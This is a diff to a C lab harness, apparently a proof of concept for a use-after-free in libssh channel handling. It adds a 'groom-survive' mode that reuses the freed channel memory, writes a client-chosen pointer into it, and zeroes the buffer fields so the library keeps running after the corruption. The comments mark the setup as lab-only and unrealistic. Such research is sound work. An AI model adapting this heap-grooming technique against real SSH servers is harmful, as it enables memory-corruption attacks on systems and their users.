@@ -24,6 +24,9 @@ static int g_send_close = 1;
 static int g_data_packets = 0;
 static int g_free_on_data = 1;
 static int g_groom = 0;
+static int g_survive = 0;
+static void *g_saved_buf = NULL;
+static void *g_saved_cbs = NULL;
 static volatile uint64_t g_target = 0x4141414141414141ull;
 static void *g_groom_ptr = NULL;
 
@@ -61,6 +64,18 @@ static int on_data(ssh_session s, ssh_channel ch, void *data, uint32_t len,
         if (g_groom && len >= 128) {
             memcpy(wire, data, sizeof(wire));
         }
+        if (g_survive) {
+            /* Lab-only: detach the stdout ssh_buffer before the channel free
+             * so channel_rcv_data() can reach its later uses after the
+             * chosen-pointer write. This is NOT a realistic app pattern. */
+            g_saved_buf = ch->stdout_buffer;
+            ch->stdout_buffer = NULL;
+            g_saved_cbs = ch->callbacks;
+            ch->callbacks = NULL;
+            printf("SERVER groom-survive saved_buf=%p saved_cbs=%p\n",
+                   g_saved_buf, g_saved_cbs);
+            fflush(stdout);
+        }
         ssh_channel_free(ch);
         if (g_groom && len >= 128) {
             /* Lab-only groom: the application reuses the just-freed 128-byte
@@ -71,10 +86,16 @@ static int on_data(ssh_session s, ssh_channel ch, void *data, uint32_t len,
             uint64_t v = 0;
             if (p != NULL) {
                 memcpy(p, wire, sizeof(wire));
+                if (g_survive) {
+                    /* grow_window() dereferences these two fields after the
+                     * write; wire bytes choose NULL for both. */
+                    memset((char *)p + 56, 0, 8);  /* stdout_buffer */
+                    memset((char *)p + 64, 0, 8);  /* stderr_buffer */
+                }
                 g_groom_ptr = p;
                 memcpy(&v, (char *)p + 120, sizeof(v));
-                printf("SERVER groom alloc=%p wire_off120=0x%llx target=%p\n",
-                       p, (unsigned long long)v, (void *)&g_target);
+                printf("SERVER groom alloc=%p wire_off120=0x%llx target=%p survive=%d\n",
+                       p, (unsigned long long)v, (void *)&g_target, g_survive);
                 fflush(stdout);
             }
         }
@@ -150,6 +171,11 @@ static int run_server(const char *keyfile)
     printf("SERVER done data_packets=%d\n", g_data_packets);
     printf("SERVER target_after=0x%llx groom_ptr=%p\n",
            (unsigned long long)g_target, g_groom_ptr);
+    if (g_survive) {
+        printf("SERVER survive buf_len=%u saved=%p\n",
+               g_saved_buf != NULL ?
+               ssh_buffer_get_len((ssh_buffer)g_saved_buf) : 0, g_saved_buf);
+    }
     fflush(stdout);
     return 0;
 }
@@ -226,12 +252,16 @@ static int run_client(void)
         memcpy(payload, marker, strlen(marker));
         payload[16] = '-';
         memcpy(payload + 120, &want, sizeof(want));
+        if (g_survive) {
+            memset(payload + 56, 0, 8);  /* stdout_buffer */
+            memset(payload + 64, 0, 8);  /* stderr_buffer */
+        }
         if (raw_data_n(s, ch->remote_channel, payload, sizeof(payload)) != 0) {
             fprintf(stderr, "raw groom data failed\n");
             return 1;
         }
-        printf("CLIENT sent groom wire pointer=0x%llx\n",
-               (unsigned long long)want);
+        printf("CLIENT sent groom wire pointer=0x%llx survive=%d\n",
+               (unsigned long long)want, g_survive);
     } else if (raw_data(s, ch->remote_channel, marker) != 0) {
         fprintf(stderr, "raw data failed\n");
         return 1;
@@ -259,7 +289,7 @@ int main(int argc, char **argv)
     ssh_init();
     pid_t pid;
     if (argc < 2 || argc > 3) {
-        fprintf(stderr, "usage: %s hostkey [data-only|no-free|groom]\n",
+        fprintf(stderr, "usage: %s hostkey [data-only|no-free|groom|groom-survive]\n",
                 argv[0]);
         return 2;
     }
@@ -270,6 +300,9 @@ int main(int argc, char **argv)
         g_free_on_data = 0;
     } else if (argc == 3 && strcmp(argv[2], "groom") == 0) {
         g_groom = 1;
+    } else if (argc == 3 && strcmp(argv[2], "groom-survive") == 0) {
+        g_groom = 1;
+        g_survive = 1;
     } else if (argc == 3) {
         fprintf(stderr, "unknown mode: %s\n", argv[2]);
         return 2;
